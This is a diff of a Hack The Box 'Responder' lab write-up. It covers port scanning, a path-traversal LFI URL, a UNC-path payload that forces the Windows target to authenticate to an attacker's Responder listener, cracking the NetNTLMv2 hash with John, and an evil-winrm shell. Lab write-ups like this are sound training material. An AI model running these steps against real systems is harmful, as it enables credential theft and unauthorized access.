@@ -4,6 +4,22 @@
 
 Lab link: [Responder](https://app.hackthebox.com/starting-point)
 
+## Completion proof
+
+![Hack The Box Responder completion proof](assets/01-completion-proof.png)
+
+## Overview
+
+Responder is a Very Easy Hack The Box Starting Point machine focused on web parameter analysis, Local File Inclusion (LFI), Windows network authentication, NetNTLMv2 password recovery, and remote access through WinRM.
+
+## Objective
+
+The objective was to investigate the web application, trigger an authentication request to the lab listener, recover the account password from the captured challenge/response, and access the Windows host to retrieve the flag.
+
+## Scope
+
+All activity was limited to the authorized Hack The Box Starting Point target. Personal VPN and target IP addresses, captured authentication material, credentials, and the flag are obscured in the screenshots and omitted from the text.
+
 ## Reconnaissance
 
 I scanned all TCP ports to identify the services exposed by the active lab target:
@@ -12,37 +28,19 @@ I scanned all TCP ports to identify the services exposed by the active lab targe
 nmap -Pn -p- -T4 --min-rate 2000 <target-ip>
 ```
 
-The scan found HTTP on port 80, WinRM on port 5985, and an additional service on port 7680. HTTP and WinRM were relevant to the investigation: the website exposed the vulnerable page parameter, and WinRM later provided remote shell access.
+The scan found HTTP on port 80, WinRM on port 5985, and an additional service on port 7680. HTTP was the entry point for investigating the page parameter; WinRM later provided remote shell access.
 
 ![Full TCP port scan showing the discovered services](assets/00-full-port-scan.png)
 
-## Overview
-
-Responder is a Very Easy Hack The Box Starting Point machine focused on web parameter analysis, Local File Inclusion (LFI), Remote File Inclusion (RFI), NTLM authentication, and password recovery from a captured NetNTLMv2 challenge/response.
-
-## Objective
-
-The objective was to enumerate the target, identify how the web application loads pages, use the authorized lab vulnerability to trigger an authentication request, recover the supplied account password, and access the Windows host through the exposed management service.
-
-## Scope and evidence
-
-All activity was performed against the authorized Hack The Box Starting Point target. The target address, captured hash, password, and flag value are not reproduced in the text of this write-up.
-
 ## Investigation process
 
-### 1. Confirming the web service
+### 1. Resolving the lab host name
 
-I started with a full TCP scan and service detection to identify the available attack surface:
-
-```bash
-nmap -Pn -p- -T4 --min-rate 2000 <target-ip>
-```
-
-The target exposed HTTP on port 80 and Windows Remote Management (WinRM) on port 5985. A follow-up request to the web service showed that the application redirected visitors from the IP address to the `unika.htb` host name. I added the host name to `/etc/hosts` so the browser could resolve it locally.
+Opening the target by IP returned a redirect to `unika.htb`. I mapped that host name to the current lab target in `/etc/hosts`, then loaded the site using the host name. The browser screenshot captures the initial resolution problem that led me to check the local host mapping.
 
 ![Browser showing the host name resolution issue](assets/01-domain-resolution.png)
 
-### 2. Identifying the application technology and parameter
+### 2. Identifying the application and input parameter
 
 I inspected the response headers with `curl`:
 
@@ -50,11 +48,11 @@ I inspected the response headers with `curl`:
 curl -I http://<target-ip>/
 ```
 
-The headers identified Apache on Windows and PHP. The page URL also contained a `page` parameter used to select the language/page content. This parameter was the most relevant input for the next test because the server was using it to decide which resource to include.
+The response headers identified Apache on Windows running PHP. The URL used a `page` parameter to select page content. Since this value controls which content is loaded, I investigated whether it was safely restricted.
 
 ![HTTP response headers identifying the web stack](assets/02-technology-identification.png)
 
-### 3. Verifying Local File Inclusion
+### 3. Testing for local file inclusion
 
 I tested whether the `page` parameter could access a local file outside the intended web directory by supplying a Windows path traversal sequence:
 
@@ -62,11 +60,11 @@ I tested whether the `page` parameter could access a local file outside the inte
 http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
 ```
 
-The response displayed the Windows `hosts` file. The PHP warning also referenced `C:\xampp\htdocs\index.php`, confirming that the target was including the requested path on the local Windows system. This demonstrated an LFI condition: a local file that was not intended to be publicly readable was returned through the page parameter.
+The response displayed the Windows `hosts` file and PHP warnings referenced the application include operation. This confirmed that path traversal through `page` could make the server read a local file outside the intended page content.
 
 ![Local Windows hosts file returned through the page parameter](assets/03-lfi-hosts-file.png)
 
-### 4. Triggering a remote authentication request
+### 4. Capturing the authentication exchange
 
 I then supplied a UNC-style network path that pointed back to my VPN interface:
 
@@ -74,17 +72,17 @@ I then supplied a UNC-style network path that pointed back to my VPN interface:
 http://unika.htb/index.php?page=//<vpn-ip>/somefile
 ```
 
-The filename was only a placeholder. The important behavior was that the Windows server attempted to access the remote SMB-style path. I ran Responder on the VPN interface to listen for that connection:
+The filename was a placeholder; the test was intended to make the Windows server attempt a remote SMB path. I started Responder on the HTB VPN interface:
 
 ```bash
 sudo responder -I tun0
 ```
 
-Responder reported that it was listening on `tun0`. When the vulnerable application attempted to include the remote path, Responder captured an NTLMv2-SSP authentication exchange from the target. The captured log was saved under `/usr/share/responder/logs/`.
+Responder reported that it was listening on `tun0`. The page request caused the target to initiate an authentication exchange, which Responder recorded in its logs. The screenshot below shows the request and listener context; sensitive addresses are obscured.
 
 ![Remote include attempt reaching the Responder listener](assets/04-rfi-responder-trigger.png)
 
-### 5. Recovering the password from the NetNTLMv2 exchange
+### 5. Recovering the password with John the Ripper
 
 The captured value was a NetNTLMv2 challenge/response, not a plaintext password. I used the supplied `rockyou` wordlist with John the Ripper to test candidate passwords:
 
@@ -94,11 +92,11 @@ john --wordlist=/usr/share/wordlists/rockyou.txt \
   /usr/share/responder/logs/SMB-NTLMv2-SSP-<target-ip>.txt
 ```
 
-John loaded one `netntlmv2` hash and found the password associated with the captured `Administrator` account. The password is intentionally omitted from this public note.
+John loaded the captured NetNTLMv2 challenge/response and found a matching password candidate for the `Administrator` account. The screenshot demonstrates the successful crack while obscuring the hash, password, and addresses.
 
 ![Responder capture and John the Ripper result](assets/05-responder-capture-and-john.png)
 
-### 6. Accessing the Windows host with WinRM
+### 6. Connecting through WinRM and locating the flag
 
 The service scan showed WinRM on TCP port 5985. I used the recovered account details with Evil-WinRM:
 
@@ -106,7 +104,7 @@ The service scan showed WinRM on TCP port 5985. I used the recovered account det
 evil-winrm -i <target-ip> -u Administrator -p <recovered-password>
 ```
 
-The successful connection opened a PowerShell-style remote shell. I navigated to the `mike` user's desktop and listed the files:
+The successful connection opened a PowerShell-style remote shell. I navigated to the `mike` user's desktop, listed its contents, and read `flag.txt`:
 
 ```powershell
 cd C:\Users\mike\Desktop
@@ -116,7 +114,7 @@ type flag.txt
 
 ![Successful Evil-WinRM session](assets/07-evil-winrm-session.png)
 
-The terminal evidence shows the `flag.txt` file being read successfully. The flag value itself is not repeated here.
+The terminal evidence shows the file being read. Usernames, command-line credentials, and the flag value are obscured in the screenshots and not repeated here.
 
 ![Reading the flag file from the remote Windows shell](assets/06-flag-proof.png)
 
@@ -136,6 +134,4 @@ Responder did not recover the plaintext password directly. It captured the chall
 
 ## Result
 
-The Responder challenge objective was completed successfully. The completion proof and screenshots document the scan, web investigation, authentication capture, password recovery, and flag retrieval.
-
-![Hack The Box Responder completion proof](assets/01-completion-proof.png)
+The Responder challenge objective was completed successfully. The completion proof appears at the beginning of this write-up, followed by evidence in the order the investigation was performed.
